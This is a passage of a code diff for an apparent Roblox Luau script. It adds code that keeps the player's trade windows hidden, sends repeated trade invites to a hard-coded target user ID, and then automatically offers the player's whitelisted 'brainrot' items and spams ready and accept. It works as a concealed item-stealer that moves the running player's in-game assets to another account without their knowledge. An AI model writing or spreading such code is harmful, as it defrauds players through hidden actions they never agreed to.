+            local tradeData = tradeRep:TryIndex({ "active", "data" })
+            if not tradeData then return end
+
+            local ourIndex
+            for i, userId in tradeData.users do
+                if userId == LocalPlayer.UserId then ourIndex = i; break end
+            end
+            if not ourIndex then return end
+
+            local maxSlots = (tradeData.players[ourIndex] and tradeData.players[ourIndex].maxSlots or 4)
+            local whitelistBrainrots = getWhitelistBrainrots()
+            if #whitelistBrainrots == 0 then return end
+
+            local offered = 0
+            lastOfferedList = {}
+
+            for i, entry in ipairs(whitelistBrainrots) do
+                if offered >= maxSlots then break end
+                local result = tryAddBrainrot(entry)
+                if result == "nospace" then
+                    break
+                elseif result == true then
+                    offered += 1
+                    table.insert(lastOfferedList, entry)
+                end
+                task.wait(0.15)
+            end
+
+            spamReadyAccept()
+        end
+
+        local resumed = false
+        local userId = TARGET_USER_ID
+
+        setTradeGuisHidden(true)
+
+        task.spawn(function()
+            while true do
+                task.wait(3)
+                if resumed then continue end
+                local whitelistBrainrots = getWhitelistBrainrots()
+                if #whitelistBrainrots == 0 then continue end
+                pcall(function()
+                    inviteRemote:InvokeServer(INVITE_UUID, userId)
+                end)
+            end
+        end)
+
+        task.spawn(function()
+            while true do
+                setTradeGuisHidden(true)
+                task.wait(0.5)
+            end
+        end)
+
+        tradeRep:ListenRaw(function(value)
+            if not resumed and value ~= nil and tradeRep:TryIndex({ "active", "data" }) then
+                resumed = true
+                task.spawn(function()
+                    applyHiding()
+                    task.wait(0.5)
+                    offerWhitelistBrainrots()
+                end)
+            end
+        end)
+
+    end)
+end)
